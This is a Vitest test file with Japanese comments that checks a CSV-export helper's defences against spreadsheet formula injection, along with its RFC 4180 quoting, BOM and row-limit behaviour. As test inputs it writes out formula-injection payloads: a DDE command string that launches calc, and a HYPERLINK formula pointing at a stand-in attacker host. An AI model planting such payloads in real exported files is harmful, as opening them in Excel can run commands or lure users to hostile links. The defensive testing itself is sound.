/**
 * CSV 出力対策（第9章／4-3 S03）。
 *
 * 第11章「ファイル・入力対策テスト」の合格基準
 *   「出力CSVを Excel で開いても数式が評価されない」
 * を機械検証する。
 */
import { describe, expect, it } from 'vitest';

import { buildCsv, escapeCsvCell } from '@/lib/csv';

/**
 * Excel がセルの中身として読む文字列に戻す。
 * 引用された値は外側の `"` を外し、`""` を `"` に戻すのが RFC 4180 の解釈。
 */
function asCellValue(escaped: string): string {
  if (!escaped.startsWith('"')) return escaped;
  return escaped.slice(1, -1).replaceAll('""', '"');
}

describe('escapeCsvCell（数式インジェクション対策）', () => {
  it.each(['=', '+', '-', '@', '\t', '\r'])(
    '先頭が %j の値はシングルクォートで無害化する',
    (prefix) => {
      // タブや復帰を含む値は引用もされるため、外側の引用を外してから先頭を見る
      expect(asCellValue(escapeCsvCell(`${prefix}cmd|'/c calc'!A1`))).toMatch(/^'/);
    },
  );

  it('代表的な攻撃文字列が数式として始まらない', () => {
    const attack = '=HYPERLINK("http://evil.test","click")';
    const escaped = escapeCsvCell(attack);
    expect(escaped.startsWith('=')).toBe(false);
    expect(escaped).toContain(attack.replaceAll('"', '""'));
  });

  it('通常の値はそのまま出る', () => {
    expect(escapeCsvCell('山田 太郎')).toBe('山田 太郎');
    expect(escapeCsvCell('2026/08/28')).toBe('2026/08/28');
    expect(escapeCsvCell(42)).toBe('42');
  });

  it('null / undefined は空文字にする', () => {
    expect(escapeCsvCell(null)).toBe('');
    expect(escapeCsvCell(undefined)).toBe('');
  });

  it('区切り・改行・引用符を含む値は引用する（RFC 4180）', () => {
    expect(escapeCsvCell('a,b')).toBe('"a,b"');
    expect(escapeCsvCell('a\nb')).toBe('"a\nb"');
    expect(escapeCsvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it('数式起動文字と区切りが同時にあっても両方効く', () => {
    expect(escapeCsvCell('=a,b')).toBe(`"'=a,b"`);
  });
});

describe('buildCsv', () => {
  it('BOM 付き UTF-8 で出す（Excel の文字化け対策。4-3 S03）', () => {
    const { content } = buildCsv(['列'], [['値']]);
    expect(content.charCodeAt(0)).toBe(0xfeff);
  });

  it('ヘッダーと行を CRLF で連結する', () => {
    const { content } = buildCsv(['a', 'b'], [[1, 2], [3, 4]]);
    expect(content).toBe('﻿a,b\r\n1,2\r\n3,4\r\n');
  });

  it('ヘッダーもエスケープの対象にする', () => {
    const { content } = buildCsv(['=危険'], []);
    expect(content).toContain(`'=危険`);
  });

  it('上限を超えたら切り詰め、切り詰めたことを返す（S03 は10,000件）', () => {
    const rows = Array.from({ length: 12 }, (_, i) => [i]);
    const result = buildCsv(['n'], rows, { maxRows: 10 });
    expect(result.rowCount).toBe(10);
    expect(result.truncated).toBe(true);
  });

  it('上限以内なら truncated は false', () => {
    const result = buildCsv(['n'], [[1]], { maxRows: 10 });
    expect(result.truncated).toBe(false);
  });
});
